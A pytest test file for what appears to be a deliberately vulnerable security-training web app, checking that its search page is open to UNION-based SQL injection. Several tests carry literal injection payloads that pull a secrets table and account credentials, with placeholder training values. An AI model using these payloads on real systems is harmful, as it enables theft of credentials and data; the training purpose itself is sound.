from app.core.seed import seed_database


def test_search_returns_matching_accounts(app, client):
    seed_database(app)
    response = client.get("/a03/search", query_string={"q": "alice"})
    assert response.status_code == 200
    assert b"alice" in response.data


def test_search_union_exfiltrates_secrets_table(app, client):
    seed_database(app)
    payload = "' UNION SELECT id, value FROM a03_secrets -- "
    response = client.get("/a03/search", query_string={"q": payload})
    assert response.status_code == 200
    assert b"sk_live_51NxFakeKeyForTraining000" in response.data


def test_search_union_exfiltrates_account_credentials(app, client):
    seed_database(app)
    payload = "' UNION SELECT id, username || ':' || password FROM injection_accounts -- "
    response = client.get("/a03/search", query_string={"q": payload})
    assert response.status_code == 200
    assert b"admin:sup3r-s3cret-admin-pw" in response.data


def test_search_union_exfiltration_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    seed_database(app)
    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    payload = "' UNION SELECT id, value FROM a03_secrets -- "
    response = client.get("/a03/search", query_string={"q": payload})
    assert response.status_code == 200
    assert b"sk_live_51NxFakeKeyForTraining000" in response.data
    assert b"Explanation" not in response.data
    assert b"Exploitation" not in response.data


def test_search_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"UNION-Based SQL Injection Data Exfiltration" in response.data
    assert b'href="/a03/search"' in response.data


def test_search_shows_vulnerable_vs_secure_code(client):
    response = client.get("/a03/search")
    assert response.status_code == 200
    assert b"Vulnerable vs. Secure" in response.data
    assert b":pattern" in response.data


def test_search_shows_detect_content(app, client):
    with app.app_context():
        from app.core.models import Settings
        from app.extensions import db

        settings = Settings.get()
        settings.show_exploit_instructions = True
        settings.scoring_enabled = False
        db.session.commit()
    response = client.get("/a03/search")
    assert response.status_code == 200
    assert b"Search for a term containing a single quote" in response.data
